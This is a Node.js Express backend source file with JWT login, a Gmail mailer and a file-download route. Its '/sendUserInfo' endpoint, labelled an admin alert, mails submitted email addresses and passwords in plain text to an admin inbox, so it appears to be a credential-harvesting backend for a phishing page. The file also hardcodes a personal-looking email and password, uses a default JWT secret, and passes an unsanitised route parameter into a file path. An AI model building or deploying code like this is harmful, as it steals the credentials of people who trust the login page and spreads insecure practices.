require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");

const app = express();

const allowedOrigins = [
  'http://localhost:3000',              // your local dev frontend URL
  'https://po0948.netlify.app' // your deployed frontend URL
];

const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "default_secret_if_none_set";

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('Not allowed by CORS'), false);
    }
    return callback(null, true);
  },
  credentials: true
}));

app.use(bodyParser.json());

// Mock user (replace with DB in production)
const USER = { id: 1, email: "egli79380@gmail.com", password: "password123_zMq-h5*wE-FdUk" };

// Login API returns JWT on success
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Email and password are required." });
  }
  if (email === USER.email && password === USER.password) {
    const token = jwt.sign({ id: USER.id, email: USER.email }, SECRET, { expiresIn: "2h" });
    return res.json({ success: true, token });
  } else {
    return res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// Setup Nodemailer transporter using Gmail SMTP
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: smtpUser,
    pass: smtpPass
  }
});

// Endpoint to send user info (for alerts to admin)
app.post('/sendUserInfo', (req, res) => {
  const userData = req.body;
  const mailOptions = {
    from: smtpUser,
    to: adminEmail,
    subject: 'User Information Alert',
    text: `Login attempt - Email: ${userData.email}, Password: ${userData.password}`
  };
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Email send error:', error);
      res.status(500).send('Failed to send email');
    } else {
      console.log('Admin email sent:', info.response);
      res.status(200).send('Email sent successfully');
    }
  });
});

// Middleware to authenticate JWT
function authenticate(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(403).json({ message: "Missing token" });
  const token = auth.split(' ')[1];
  try {
    req.user = jwt.verify(token, SECRET);
    next();
  } catch (err) {
    res.status(403).json({ message: "Invalid or expired token" });
  }
}

// Example protected route to download files
app.get('/api/file/:id', authenticate, (req, res) => {
  const fileId = req.params.id;
  const filePath = path.join(__dirname, 'protected_files', fileId);
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ message: "File not found" });
  }
});

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));